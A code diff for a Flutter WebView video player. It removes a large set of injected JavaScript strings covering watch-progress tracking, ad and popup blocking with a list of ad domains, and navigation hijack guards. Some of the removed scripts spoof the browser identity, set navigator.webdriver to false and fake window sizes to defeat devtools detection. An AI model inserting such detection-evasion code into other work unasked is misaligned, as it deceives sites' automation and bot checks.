@@ -1,8 +1,7 @@
 import 'dart:async';
 import 'dart:collection';
-import 'dart:io';
+import 'dart:convert';
 
-import 'package:cached_network_image/cached_network_image.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter/gestures.dart';
 import 'package:flutter/material.dart';
@@ -12,11 +11,9 @@ import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:go_router/go_router.dart';
 import 'package:window_manager/window_manager.dart';
 
-import '../../../core/config/app_config.dart';
 import '../../../core/theme/app_colors.dart';
-import '../../../core/theme/app_spacing.dart';
 import '../../../core/utils/host_utils.dart';
-import '../../../core/utils/tmdb_image_url.dart';
+import '../../../core/utils/player_platform.dart';
 import '../../../domain/entities/media_item.dart';
 import '../../../domain/entities/media_type.dart';
 import '../../../domain/entities/user_progress.dart';
@@ -29,813 +26,21 @@ import '../../providers/watch_history_providers.dart';
 import '../../providers/webview_providers.dart';
 import '../../router/app_router.dart';
 import '../../../data/services/remote_blocklist.dart';
+import 'player_scripts.dart';
+import 'web_view_player_config.dart';
+import 'widgets/next_episode_overlay.dart';
+import 'widgets/player_error_view.dart';
+import 'widgets/player_window_actions.dart';
 
-// ─── Bridge JS — injected at document-end, guarded by flag ───────────────────
+// ─── Injected JS ────────────────────────────────────────────────────────────
 //
-// Forwards postMessage events from the page’s own scripts (e.g. Provider A’s
-// PLAYER_EVENT) to the Dart side.  Kept as a supplementary source; the
-// primary tracking is now in _kVideoProgressJs.
-
-const _kBridgeJs = '''
-(function() {
-  if (window.__spoviesBridgeInit) return;
-  window.__spoviesBridgeInit = true;
-  window.addEventListener('message', function(e) {
-    try {
-      var data = e.data;
-      if (!data) return;
-      
-      // Filter out common tracking/ad noise (Yandex Metrica, etc.)
-      if (typeof data === 'string' && (data.startsWith('__ym') || data.startsWith('adscore'))) {
-        return;
-      }
-
-      var d = (typeof data === 'string') ? data : JSON.stringify(data);
-      if (d && window.flutter_inappwebview) {
-        // Only forward if it looks like one of our events (PlayerEvent or activity)
-        if (d.includes('"type"') || d.includes('"event"') || d.includes('"channel"')) {
-          window.flutter_inappwebview.callHandler('spoviesEventBridge', d);
-        }
-      }
-    } catch (ex) {}
-  });
-})();
-''';
-
-// ─── Universal video progress tracking + auto-resume ─────────────────────
+// The scripts injected into every WebView session used to live here as
+// const Dart strings (~900 lines). They moved to `assets/js/` and are
+// loaded once at app startup by `PlayerScripts.load()` (see main.dart).
 //
-// Hooks directly into the HTML5 <video> element’s native events so watch
-// progress is tracked for **every** plugin — not just those that emit their
-// own postMessage events (like Provider A).
-//
-// Also handles auto-resume: if [resumeTime] > 0, the script seeks the
-// <video> to that position as soon as the media metadata is loaded.
-//
-// IMPORTANT: this UserScript must be injected with `forMainFrameOnly: false`
-// because streaming sites put their <video> inside cross-origin iframes.
-
-String _videoProgressJs(double resumeTime) =>
-    '''
-(function() {
-  if (window.__spoviesVideoTracker) return;
-  window.__spoviesVideoTracker = true;
-
-  var THROTTLE_MS = 3000;
-  var lastSent = 0;
-  var RESUME_TARGET = $resumeTime;
-  var seekDone = false;
-
-  function send(eventName, video) {
-    if (!video || !video.duration || isNaN(video.duration)) return;
-    var now = Date.now();
-    if (eventName === 'timeupdate' && (now - lastSent) < THROTTLE_MS) return;
-    lastSent = now;
-
-    var progress = (video.currentTime / video.duration) * 100;
-    var payload = JSON.stringify({
-      type: 'PLAYER_EVENT',
-      data: {
-        event: eventName,
-        currentTime: video.currentTime,
-        duration: video.duration,
-        progress: progress
-      }
-    });
-    if (window.flutter_inappwebview) {
-      window.flutter_inappwebview.callHandler('spoviesEventBridge', payload);
-    }
-  }
-
-  var patched = new WeakSet();
-
-  function hookVideo(video) {
-    if (patched.has(video)) return;
-    patched.add(video);
-
-    // --- progress tracking listeners ---
-    ['timeupdate', 'play', 'pause', 'ended', 'seeked'].forEach(function(ev) {
-      video.addEventListener(ev, function() { send(ev, video); });
-    });
-
-    // --- auto-resume seek ---
-    if (RESUME_TARGET > 0 && !seekDone) {
-      function doSeek() {
-        if (seekDone) return;
-        if (video.duration && video.duration > 0 && RESUME_TARGET < video.duration) {
-          seekDone = true;
-          video.currentTime = RESUME_TARGET;
-        }
-      }
-      // Try immediately if metadata already loaded.
-      if (video.readyState >= 1) {
-        doSeek();
-      } else {
-        video.addEventListener('loadedmetadata', doSeek, { once: true });
-      }
-      // Safety net: also try on canplay in case loadedmetadata already fired.
-      video.addEventListener('canplay', doSeek, { once: true });
-    }
-  }
-
-  function scanDoc(root) {
-    if (!root || !root.querySelectorAll) return;
-    root.querySelectorAll('video').forEach(hookVideo);
-  }
-
-  scanDoc(document);
-
-  var mo = new MutationObserver(function(mutations) {
-    for (var i = 0; i < mutations.length; i++) {
-      var added = mutations[i].addedNodes;
-      for (var j = 0; j < added.length; j++) {
-        var node = added[j];
-        if (node.nodeName === 'VIDEO') hookVideo(node);
-        if (node.querySelectorAll) {
-          node.querySelectorAll('video').forEach(hookVideo);
-        }
-      }
-    }
-  });
-  mo.observe(document.documentElement, { childList: true, subtree: true });
-
-  // Interval fallback: scan same-origin iframes every 2s.
-  setInterval(function() {
-    try {
-      var frames = document.querySelectorAll('iframe');
-      for (var i = 0; i < frames.length; i++) {
-        try {
-          var doc = frames[i].contentDocument || frames[i].contentWindow.document;
-          scanDoc(doc);
-        } catch(e) {}
-      }
-    } catch(e) {}
-  }, 2000);
-})();
-''';
-
-// ─── iOS inline-video fix — injected at document-start ───────────────────────
-//
-// On iOS, any <video> element that lacks the `playsinline` attribute is
-// captured by the native AVPlayer full-screen overlay, killing the web-based
-// player controls. This script:
-//   1. Stamps `playsinline` + `webkit-playsinline` on every existing <video>.
-//   2. Installs a MutationObserver so dynamically-injected <video> elements
-//      (the norm for streaming sites) are patched before they can trigger the
-//      native player.
-//   3. Overrides `HTMLMediaElement.play` to re-apply the attributes on every
-//      play attempt as a last-resort safety net.
-//
-// This is injected at AT_DOCUMENT_START so the observer is live before the
-// page's own scripts run and add any <video> nodes.
-
-const _kIosInlineVideoFix = '''
-(function() {
-  if (window.__spoviesInlineFixed) return;
-  window.__spoviesInlineFixed = true;
-
-  function patchVideo(v) {
-    v.setAttribute('playsinline', '');
-    v.setAttribute('webkit-playsinline', '');
-    v.setAttribute('x-webkit-airplay', 'deny');
-  }
-
-  // Patch all videos present right now (usually none at document-start,
-  // but safe to run anyway).
-  document.querySelectorAll('video').forEach(patchVideo);
-
-  // Watch for new video elements added by the streaming site's scripts.
-  var mo = new MutationObserver(function(mutations) {
-    for (var i = 0; i < mutations.length; i++) {
-      var nodes = mutations[i].addedNodes;
-      for (var j = 0; j < nodes.length; j++) {
-        var n = nodes[j];
-        if (n.nodeName === 'VIDEO') { patchVideo(n); }
-        if (n.querySelectorAll) {
-          n.querySelectorAll('video').forEach(patchVideo);
-        }
-      }
-    }
-  });
-  mo.observe(document.documentElement, { childList: true, subtree: true });
-
-  // Last-resort: re-patch on every play() call, because some players
-  // recreate the <video> element or strip attributes before calling play().
-  var _origPlay = HTMLMediaElement.prototype.play;
-  HTMLMediaElement.prototype.play = function() {
-    patchVideo(this);
-    return _origPlay.apply(this, arguments);
-  };
-})();
-''';
-
-// ─── Suppress native Fullscreen API — injected at document-start ─────────────
-//
-// Both iOS and Android WebViews intercept the Fullscreen API and hand the
-// video to a native player overlay, which kills the web-based subtitle
-// rendering and player controls.  This script no-ops every fullscreen
-// entry-point so the video stays inside the WebView at all times.
-// The player is already running in landscape immersive mode, so the user
-// experience is effectively fullscreen without the native takeover.
-
-const _kSuppressFullscreenJs = '''
-(function() {
-  if (window.__spoviesNoNativeFS) return;
-  window.__spoviesNoNativeFS = true;
-
-  // No-op all fullscreen entry points.
-  Element.prototype.requestFullscreen = function() { return Promise.resolve(); };
-  if (Element.prototype.webkitRequestFullscreen) {
-    Element.prototype.webkitRequestFullscreen = function() {};
-  }
-  if (typeof HTMLVideoElement !== 'undefined') {
-    var vp = HTMLVideoElement.prototype;
-    if (vp.webkitEnterFullscreen)  vp.webkitEnterFullscreen  = function() {};
-    if (vp.webkitEnterFullScreen)  vp.webkitEnterFullScreen  = function() {};
-  }
-
-  // Tell the page that fullscreen is not available, so players fall back
-  // to their CSS-based "theater" / inline mode.
-  Object.defineProperty(document, 'fullscreenEnabled',        { get: function() { return false; } });
-  Object.defineProperty(document, 'webkitFullscreenEnabled',  { get: function() { return false; } });
-})();
-''';
-
-// ─── Android WebView identity spoof — injected at document-start ─────────────
-//
-// Even when a custom desktop User-Agent string is set, Android WebView still
-// injects `sec-ch-ua: "Android WebView"` HTTP headers AND exposes
-// `navigator.userAgentData.brands` containing "Android WebView" to JavaScript.
-// Many streaming sites (e.g. example.com) check these hints and either:
-//   a) Serve a mobile HTML layout whose DOM is missing elements the desktop
-//      player script expects → `null.addEventListener` crash, blank player.
-//   b) Outright block or degrade the experience for detected WebViews.
-//
-// This script overrides `navigator.userAgentData` to present as a standard
-// desktop Chrome browser.  It does NOT affect HTTP `sec-ch-ua` headers
-// (those are set at the native layer), but covers all JS-side detections.
-
-const _kSpoofUserAgentDataJs = '''
-(function() {
-  if (window.__spoviesUASpoof) return;
-  window.__spoviesUASpoof = true;
-
-  if (typeof navigator.userAgentData === 'undefined') return;
-
-  var brands = [
-    { brand: 'Not/A)Brand',  version: '8'   },
-    { brand: 'Chromium',     version: '124' },
-    { brand: 'Google Chrome', version: '124' }
-  ];
-
-  var spoofed = {
-    brands:   brands,
-    mobile:   false,
-    platform: 'Windows',
-    getHighEntropyValues: function(hints) {
-      var r = {};
-      for (var i = 0; i < hints.length; i++) {
-        switch (hints[i]) {
-          case 'brands':          r.brands          = brands;    break;
-          case 'mobile':          r.mobile          = false;     break;
-          case 'platform':        r.platform        = 'Windows'; break;
-          case 'platformVersion': r.platformVersion = '15.0.0';  break;
-          case 'uaFullVersion':   r.uaFullVersion   = '124.0.6367.60'; break;
-          case 'architecture':    r.architecture    = 'x86';     break;
-          case 'model':           r.model           = '';        break;
-        }
-      }
-      return Promise.resolve(r);
-    },
-    toJSON: function() {
-      return { brands: brands, mobile: false, platform: 'Windows' };
-    }
-  };
-
-  try {
-    Object.defineProperty(navigator, 'userAgentData', {
-      get: function() { return spoofed; },
-      configurable: true
-    });
-  } catch(e) {}
-})();
-''';
-
-// ─── CSS — injected at document-start ────────────────────────────────────────
-// • Disables text selection & long-press callouts globally.
-// • Constrains popup/dialog dimensions so they don't overflow on mobile.
-// Does NOT touch pointer-events so scrollable lists remain fully interactive.
-
-const _kNoSelectCss = '''
-(function() {
-  var s = document.createElement('style');
-  s.textContent = [
-    '* {',
-    '  -webkit-user-select: none !important;',
-    '  user-select: none !important;',
-    '  -webkit-touch-callout: none !important;',
-    '}',
-    '.modal, .popup, [class*="dialog"], [class*="Dialog"],',
-    '[class*="dropdown"], [class*="menu-popup"], [class*="select-menu"] {',
-    '  max-height: 60vh !important;',
-    '  max-width: 80vw !important;',
-    '  overflow-y: auto !important;',
-    '}',
-  ].join('');
-  (document.head || document.documentElement).appendChild(s);
-})();
-''';
-
-// ─── User Activity Tracker — injected at document-start ─────────────────────
-//
-// Detects mouse movement, touches, and key presses inside the WebView and
-// relays them to Flutter to wake up the auto-hiding UI controls.
-// This avoids putting a Flutter Listener over the WebView, which breaks
-// native gesture routing on Android and Windows.
-const _kUserActivityJs = '''
-(function() {
-  if (window.__spoviesActivityTracker) return;
-  window.__spoviesActivityTracker = true;
-  var THROTTLE_MS = 500;
-  var lastSent = 0;
-  function reportActivity() {
-    var now = Date.now();
-    if (now - lastSent < THROTTLE_MS) return;
-    lastSent = now;
-    if (window.flutter_inappwebview) {
-      window.flutter_inappwebview.callHandler('spoviesEventBridge', JSON.stringify({ type: 'USER_ACTIVITY' }));
-    }
-  }
-  window.addEventListener('mousemove', reportActivity, { passive: true });
-  window.addEventListener('touchstart', reportActivity, { passive: true });
-  window.addEventListener('click', reportActivity, { passive: true });
-  window.addEventListener('keydown', reportActivity, { passive: true });
-})();
-''';
-
-// ─── Ad & popup removal JS — injected at document-end ─────────────────────────
-//
-// Removes common ad overlays, tracking iframes, and misbehaving click-jackers
-// from the DOM.  A MutationObserver ensures dynamically-injected ads are caught
-// throughout the page’s lifetime.
-
-// ─── AdGuard-style Request Interceptor — injected at document-start ──────────
-//
-// Patches the browser's networking APIs (fetch and XHR) to block requests
-// to known ad domains before they leave the WebView.  This mimics DNS-level
-// blocking without the overhead of platform channel communication.
-
-const String _kSpoviesIsAdJs = '''
-  (function() {
-    if (window.__spoviesIsAdReady) return;
-    window.__spoviesIsAdReady = true;
-
-    // JS-level instant blocklist for fetch/XHR/WebSocket interception.
-    // The full ~35 k native blocklist (OISD / AdGuard / Steven Black) does
-    // the heavy lifting in shouldInterceptRequest; this list is just a
-    // belt-and-braces guard for substring matches that load before the
-    // Dart side has had a chance to intercept.
-    //
-    // SUBSTRING MATCH FOOTGUN: every entry below is matched as a raw
-    // substring against the *entire* URL. Generic words like \"ads\" must
-    // never appear here — they trigger false positives on innocuous paths
-    // (\"loads\", \"uploads\", \"headers\", \"payloads\", \"downloads\"…) and
-    // can starve legitimate API endpoints. Legitimate streaming-host
-    // domains (host-a / host-b / host-c / host-d / …) must never
-    // appear either — many aggregators fetch their server menu through
-    // those hosts, and blocking the fetch leaves the picker UI empty.
-    var quickAds = [
-      // Google ad stack
-      'doubleclick.net', 'googlesyndication', 'adservice.google',
-      'adsbygoogle',
-      // Pop/popunder networks
-      'popads.net', 'popcash.net', 'juicyads', 'exoclick',
-      'trafficjunky', 'propellerads', 'adsterra', 'onclkds.com',
-      'onclickmax', 'pushame', 'hilltopads', 'adtng', 'adrunnr',
-      'adskeeper', 'clickadu', 'clickaine',
-      // Aggressive ad redirector domains seen on streaming sites
-      'gamerhit', 'trakzon', 'goosebomb', 'gryphline'
-    ];
-
-    window.__spoviesIsAd = function(url) {
-      if (!url) return false;
-      var s = url.toString().toLowerCase();
-      for (var i = 0; i < quickAds.length; i++) {
-        if (s.indexOf(quickAds[i]) !== -1) return true;
-      }
-      return false;
-    };
-  })();
-''';
-
-const String _kAdGuardJs = '''
-    (function() {
-      if (window.__spoviesAdGuard) return;
-      window.__spoviesAdGuard = true;
-
-      var isBlocked = window.__spoviesIsAd || function() { return false; };
-
-      // 1. Patch Fetch API
-      var _origFetch = window.fetch;
-      window.fetch = function(input, init) {
-        var url = (typeof input === 'string') ? input : (input && input.url);
-        if (isBlocked(url)) {
-          return Promise.reject(new TypeError('Blocked by Spovies AdGuard'));
-        }
-        return _origFetch.apply(this, arguments);
-      };
-
-      // 2. Patch XMLHttpRequest
-      var _origOpen = XMLHttpRequest.prototype.open;
-      XMLHttpRequest.prototype.open = function(method, url) {
-        if (isBlocked(url)) {
-          this.__blocked = true;
-          return;
-        }
-        return _origOpen.apply(this, arguments);
-      };
-      var _origSend = XMLHttpRequest.prototype.send;
-      XMLHttpRequest.prototype.send = function() {
-        if (this.__blocked) return;
-        return _origSend.apply(this, arguments);
-      };
-
-      // 3. Patch sendBeacon (tracking)
-      if (navigator.sendBeacon) {
-        var _origBeacon = navigator.sendBeacon;
-        navigator.sendBeacon = function(url, data) {
-          if (isBlocked(url)) return true; 
-          return _origBeacon.apply(this, arguments);
-        };
-      }
-
-      // 4. Patch WebSocket
-      var _origWS = window.WebSocket;
-      window.WebSocket = function(url, protocols) {
-        if (isBlocked(url)) {
-          throw new Error('Blocked by Spovies AdGuard');
-        }
-        return new _origWS(url, protocols);
-      };
-      window.WebSocket.prototype = _origWS.prototype;
-    })();
-''';
-
-const String _kConsoleKillerJs = '''
-    (function() {
-      // Brutally disable console functions to stop plugin event flood on Windows.
-      // Many streaming sites use console.clear() in loops to detect/prevent devtools.
-      var noOp = function() {};
-      var originalConsole = window.console;
-      if (originalConsole) {
-        window.console.log = noOp;
-        window.console.warn = noOp;
-        window.console.error = noOp;
-        window.console.debug = noOp;
-        window.console.info = noOp;
-        window.console.clear = noOp;
-        window.console.table = noOp;
-        window.console.count = noOp;
-        window.console.dir = noOp;
-      }
-      
-      // Attempt to bypass "DEVTOOL" detection by spoofing common checks.
-      // Sites often check if outerWidth/Height matches innerWidth/Height.
-      Object.defineProperty(window, 'outerWidth', { get: () => window.innerWidth });
-      Object.defineProperty(window, 'outerHeight', { get: () => window.innerHeight });
-      
-      // Spoof webdriver property.
-      Object.defineProperty(navigator, 'webdriver', { get: () => false });
-    })();
-  ''';
-
-const _kAdRemovalJs = '''
-(function() {
-  if (window.__spoviesAdBlock) return;
-  window.__spoviesAdBlock = true;
-
-  // -------- Ad selectors --------
-  //
-  // SURGICAL ONLY. Generic UI words like \"popup\", \"modal\", or \"overlay\"
-  // (without an `ad-` qualifier) are EXCLUDED on purpose — streaming-site
-  // server-pickers, caption-pickers and quality-pickers virtually always
-  // ship with class names like `server-popup` / `quality-modal` /
-  // `caption-overlay`, and matching them shreds the player's own UI on
-  // Android & iOS (mobile content mode). EasyList convention is the
-  // template here: anchor every selector with `ad`, `ads`, `adsbygoogle`,
-  // or a known ad-network identifier.
-  var adSelectors = [
-    // --- iframes ---
-    'iframe[src*="doubleclick.net"]', 'iframe[src*="googlesyndication"]',
-    'iframe[src*="adservice.google"]', 'iframe[src*="adsbygoogle"]',
-    'iframe[src*="popads"]', 'iframe[src*="popcash"]',
-    'iframe[src*="juicyads"]', 'iframe[src*="exoclick"]',
-    'iframe[src*="trafficjunky"]', 'iframe[src*="propellerads"]',
-    'iframe[src*="adsterra"]', 'iframe[src*="onclkds"]',
-    'iframe[src*="onclickmax"]', 'iframe[src*="pushame"]',
-    // --- AdSense / Google Tag ---
-    'ins.adsbygoogle', 'div[id^="google_ads"]',
-    'div[class*="adsbygoogle"]',
-    // --- explicit ad containers (ad- / -ad / ads- / _ad_ / etc.) ---
-    'div[class*="ad-overlay"]', 'div[class*="ad-container"]',
-    'div[class*="ad-banner"]', 'div[class*="ad-banner-"]',
-    'div[class*="ad-block"]', 'div[class*="ad-slot"]',
-    'div[class*="ad-modal"]', 'div[class*="ad-popup"]',
-    'div[class*="ad-wrapper"]', 'div[class*="ad-frame"]',
-    'div[class*="ad-float"]', 'div[class*="ad-sticky"]',
-    'div[class~="ads"]', 'div[id~="ads"]',
-    'div[class*="banner-ad"]', 'div[class*="popup-ad"]',
-    'div[class*="modal-ad"]', 'div[class*="float-ad"]',
-    'div[class*="sticky-ad"]', 'div[class*="overlay-ad"]',
-    'div[id*="ad-popup"]', 'div[id*="popup-ad"]',
-    'div[id*="ad-overlay"]', 'div[id*="overlay-ad"]',
-    // --- popunders (kept; \"popunder\" is virtually never legitimate UI) ---
-    'div[class*="popunder"]', 'div[id*="popunder"]',
-    // --- pre-roll / interstitial ad slots ---
-    'div[class*="preroll-ad"]', 'div[class*="ad-preroll"]',
-    'div[class*="interstitial-ad"]', 'div[class*="ad-interstitial"]',
-    // --- anchor patterns specific to ad redirects ---
-    'a[target="_blank"][rel*="nofollow"][href*="click"]',
-    'a[target="_blank"][rel*="nofollow"][href*="track"]',
-    'a[target="_blank"][href*="redirect.php"]',
-  ].join(',');
-
-  // -------- User-gesture tracking --------
-  //
-  // Click-jacker overlays usually appear *between* user gestures, while
-  // legitimate UI (server menu, caption menu) appears as a direct result
-  // of the user tapping a button. Recording the most recent user input
-  // lets the fixed-position sweep skip elements that almost certainly
-  // belong to the user's own interaction.
-  var __lastUserInput = 0;
-  ['pointerdown', 'mousedown', 'touchstart', 'click', 'keydown']
-    .forEach(function(ev) {
-      window.addEventListener(ev, function() {
-        __lastUserInput = Date.now();
-      }, { capture: true, passive: true });
-    });
-
-  // -------- Legitimate-UI heuristic --------
-  //
-  // The ARIA role list is taken from the WAI-ARIA \"widget\" roles plus
-  // common implicit dialog patterns. Elements containing interactive
-  // children are also exempt — popunders almost never have form controls
-  // or menu items inside them.
-  var __uiRoles = {
-    dialog: 1, alertdialog: 1, menu: 1, menubar: 1,
-    listbox: 1, combobox: 1, tablist: 1, tabpanel: 1,
-    tooltip: 1, tree: 1, treeitem: 1, grid: 1, group: 1
-  };
-  var __interactiveQ = 'button, select, input, textarea,' +
-    ' [role="button"], [role="menuitem"], [role="option"],' +
-    ' [role="tab"], [role="checkbox"], [role="radio"]';
-
-  function isLikelyUserUi(el) {
-    var role = (el.getAttribute('role') || '').toLowerCase();
-    if (__uiRoles[role]) return true;
-    if (el.querySelector(__interactiveQ)) return true;
-    if (el.hasAttribute('aria-modal')) return true;
-    // Recently-appeared element following a user tap is almost certainly
-    // a user-initiated menu/dialog, not a popunder.
-    if (Date.now() - __lastUserInput < 1500) return true;
-    return false;
-  }
-
-  function removeAds() {
-    var style = 'display:none!important;visibility:hidden!important;pointer-events:none!important;opacity:0!important;width:0px!important;height:0px!important;';
-
-    document.querySelectorAll(adSelectors).forEach(function(el) {
-      if (el.style.display !== 'none') {
-        el.setAttribute('style', style);
-      }
-    });
-
-    // Heuristic fixed-position sweep — only catches click-jackers that
-    // slipped past the selector list. The threshold is z-index >= 1000:
-    // legitimate menus & dialogs on streaming sites typically sit in the
-    // 100-999 range, while click-jacker overlays use 9999+.
-    document.querySelectorAll('div, section, aside').forEach(function(el) {
-      if (el.getAttribute('data-spovies') === 'handled') return;
-      var cs = window.getComputedStyle(el);
-      if (cs.position !== 'fixed') return;
-      var z = parseInt(cs.zIndex, 10);
-      if (!z || z < 1000) return;
-      // Skip the actual video player and anything containing it.
-      if (el.querySelector('video') ||
-          el.querySelector('iframe[src*="embed"]')) return;
-      // Skip user UI (ARIA roles, interactive children, recent gesture).
-      if (isLikelyUserUi(el)) return;
-      el.setAttribute('style', style);
-      el.setAttribute('data-spovies', 'handled');
-    });
-  }
-
-  removeAds();
-
-  var mo = new MutationObserver(function() { removeAds(); });
-  mo.observe(document.documentElement, { childList: true, subtree: true });
-
-  // Periodic fallback sweep — catches ads injected via timers.
-  setInterval(removeAds, 1500);
-
-  // Neuter window.open so JS-driven popups are silently swallowed.
-  window.open = function() { return null; };
-
-  // Neuter document.createElement for ad iframes/scripts.
-  var _origCreate = document.createElement.bind(document);
-  document.createElement = function(tag) {
-    var el = _origCreate(tag);
-    if (tag.toLowerCase() === 'iframe') {
-      var _origSrc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
-      if (_origSrc && _origSrc.set) {
-        var origSet = _origSrc.set;
-        Object.defineProperty(el, 'src', {
-          set: function(v) {
-            var isBlocked = window.__spoviesIsAd || function() { return false; };
-            if (isBlocked(v)) return;
-            origSet.call(this, v);
-          },
-          get: function() { return _origSrc.get ? _origSrc.get.call(this) : ''; }
-        });
-      }
-    }
-    return el;
-  };
-})();
-''';
-
-// ─── Anti click-jacking JS — injected at document-start ──────────────────────
-//
-// Intercepts click events at the capture phase to block popunder scripts
-// and click-jacking overlays that redirect to ad pages.
-
-const _kAntiClickjackJs = '''
-(function() {
-  if (window.__spoviesAntiCJ) return;
-  window.__spoviesAntiCJ = true;
-
-  var isAdUrl = window.__spoviesIsAd || function() { return false; };
-
-  // ── 1. Block <a> clicks to known ad domains and about:blank ──────────
-  //
-  // Only reject anchors whose destination href matches a known ad pattern
-  // OR is the empty-page click-jacker. `about:blank` anchors overlaid on
-  // the player are how some streaming sites blank out the main frame when
-  // the user taps — onCreateWindow returns false on the Dart side, but
-  // Windows WebView2's fallback is to load the link in the current frame,
-  // killing playback. Catching it here prevents the navigation from being
-  // dispatched at all.
-  //
-  // Real user-initiated `target=\"_blank\"` clicks are still allowed —
-  // popup creation is blocked at the native onCreateWindow layer.
-  function isBlankishHref(h) {
-    if (!h) return true; // empty href = same-page anchor or click-jacker stub
-    var s = h.toLowerCase().trim();
-    return s === 'about:blank' || s === '#' || s === 'javascript:void(0)' ||
-           s === 'javascript:void(0);' || s.indexOf('about:') === 0;
-  }
-  document.addEventListener('click', function(e) {
-    var t = e.target;
-    while (t && t.nodeName !== 'A' && t.nodeName !== 'BODY') {
-      t = t.parentNode;
-    }
-    if (t && t.nodeName === 'A') {
-      var href = t.getAttribute('href') || '';
-      var target = (t.getAttribute('target') || '').toLowerCase();
-      // about:blank / javascript:void(0) + target=_blank is the canonical
-      // click-jacker overlay shape — kill it. Pure same-page `#` anchors
-      // without target=_blank are left alone (legitimate scroll links).
-      if (isAdUrl(href) ||
-          (isBlankishHref(href) && target === '_blank')) {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        return false;
-      }
-    }
-  }, true);
-
-  // ── 2. Block window.open / popunder via wrapped click listeners ───────
-  var _origAEL = EventTarget.prototype.addEventListener;
-  EventTarget.prototype.addEventListener = function(type, fn, opts) {
-    if (type === 'click' && (this === document || this === document.body || this === window)) {
-      var wrapped = function(e) {
-        var _openBackup = window.open;
-        window.open = function() { return null; };
-        try { fn.call(this, e); } catch(ex) {}
-        window.open = _openBackup;
-      };
-      return _origAEL.call(this, type, wrapped, opts);
-    }
-    return _origAEL.call(this, type, fn, opts);
-  };
-
-  // ── 3. Block Location.prototype navigations ───────────────────────────
-  //
-  // The "skip button opens an ad" pattern most commonly works by placing
-  // a transparent div over the skip button whose onclick calls
-  // location.assign() or location.replace() with an ad URL.
-  // shouldOverrideUrlLoading on Android does NOT reliably fire for all
-  // programmatic same-page navigations, so we patch them in JS too.
-  //
-  // We block:
-  //  a. Known ad domains (as above)
-  //  b. Any non-http(s) scheme (intent://, market://, fb:// etc.) —
-  //     these are Android deep-link tricks that open external apps.
-
-  function isSuspiciousNavigation(url) {
-    if (!url) return false;
-    var s = url.toString();
-    // Block non-standard schemes — the player only needs http/https/blob/data.
-    var scheme = s.split(':')[0].toLowerCase();
-    if (scheme !== 'http' && scheme !== 'https' &&
-        scheme !== 'blob' && scheme !== 'data' &&
-        scheme !== 'about' && scheme !== 'javascript') {
-      return true;
-    }
-    
-    // Check known ad domains quickly
-    if (isAdUrl(s)) return true;
-
-    // Aggressive click-hijack prevention:
-    // If JS is trying to navigate the main frame to a completely different domain,
-    // block it. The player should never navigate away from itself programmatically.
-    try {
-      var newUrl = new URL(s, window.location.href);
-      if (newUrl.protocol === 'about:' || newUrl.protocol === 'data:') {
-         return true; // Programmatic navigation to about:blank or data: is blocked
-      }
-
-      var currentHost = window.location.hostname;
-      var newHost = newUrl.hostname;
-      
-      var getBase = function(h) {
-        var p = h.split('.');
-        if (p.length < 2) return h;
-        return p[p.length - 2] + '.' + p[p.length - 1];
-      };
-      
-      if (currentHost && newHost && getBase(currentHost) !== getBase(newHost)) {
-         return true; // Block cross-domain hijack!
-      }
-    } catch(e) {}
-
-    return false;
-  }
-
-  var _origAssign = Location.prototype.assign;
-  Location.prototype.assign = function(url) {
-    if (isSuspiciousNavigation(url)) return;
-    return _origAssign.apply(this, arguments);
-  };
-
-  var _origReplace = Location.prototype.replace;
-  Location.prototype.replace = function(url) {
-    if (isSuspiciousNavigation(url)) return;
-    return _origReplace.apply(this, arguments);
-  };
-
-  // ── 4. Catch setTimeout-delayed navigations that bypass click checks ──
-  //
-  // Some ad scripts do: elem.onclick = function() { setTimeout(function() {
-  //   location.href = 'ad-url'; }, 0); }
-  // The click interceptor above (step 1) doesn't block this because the
-  // navigation is scheduled asynchronously.  We catch it by also patching
-  // the href setter on the location object.
-  try {
-    var locProto = Location.prototype;
-    var origHrefDescriptor = Object.getOwnPropertyDescriptor(locProto, 'href');
-    if (origHrefDescriptor && origHrefDescriptor.set) {
-      var origSet = origHrefDescriptor.set;
-      Object.defineProperty(locProto, 'href', {
-        get: origHrefDescriptor.get,
-        set: function(url) {
-          if (isSuspiciousNavigation(url)) return;
-          origSet.call(this, url);
-        },
-        configurable: true,
-      });
-    }
-  } catch(e) {
-    // Location.prototype may not be patchable on all WebView versions; safe to ignore.
-  }
-
-  // ── 5. Neuter programmatic clicks on unattached links and forms ──
-  //
-  // Drop the blanket `target === '_blank'` reject for the same reason as
-  // step 1 — many player UIs script `<a target=\"_blank\">.click()` to open
-  // server choices; popup creation itself is already blocked natively.
-  var _origAnchorClick = HTMLAnchorElement.prototype.click;
-  HTMLAnchorElement.prototype.click = function() {
-    if (isAdUrl(this.href) || isSuspiciousNavigation(this.href)) return;
-    return _origAnchorClick.apply(this, arguments);
-  };
-
-  var _origFormSubmit = HTMLFormElement.prototype.submit;
-  HTMLFormElement.prototype.submit = function() {
-    if (isAdUrl(this.action) || isSuspiciousNavigation(this.action)) return;
-    return _origFormSubmit.apply(this, arguments);
-  };
-})();
-''';
+// The `UserScript` list assembled from those files is built in
+// `web_view_player_config.dart` — see `WebViewPlayerConfig.buildUserScripts`
+// for the ordering rationale and platform-conditional inclusion logic.
 
 /// Full-screen WebView player.
 ///
@@ -887,8 +92,13 @@ class WebViewPlayerScreen extends ConsumerStatefulWidget {
 }
 
 class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
-    with WidgetsBindingObserver {
-  double _loadProgress = 0;
+    with WidgetsBindingObserver, WindowListener {
+  /// Page-load progress as a notifier rather than setState state — only the
+  /// progress bar and the initial-load overlay need to react. Putting it in
+  /// `setState` rebuilt the entire `Scaffold > Stack` tree (including the
+  /// `InAppWebView`) on every percent during a load.
+  final ValueNotifier<double> _loadProgress = ValueNotifier<double>(0);
+
   bool _isNavigating = false;
 
   /// `true` when this screen is being torn down because the user pressed
@@ -915,6 +125,13 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   Timer? _controlsTimer;
   bool _showControls = true;
 
+  /// Last time `_resetControlsTimer` actually re-armed `_controlsTimer`
+  /// (epoch ms). Used to coalesce the per-frame pointer-event flood
+  /// (`Listener.onPointerHover` fires on every mouse move on Windows) into
+  /// at most one Timer cancel + recreate per `_kControlsTimerCoalesceMs`.
+  int _lastControlsTimerResetMs = 0;
+  static const int _kControlsTimerCoalesceMs = 500;
+
   bool _showNextEpisodeOverlay = false;
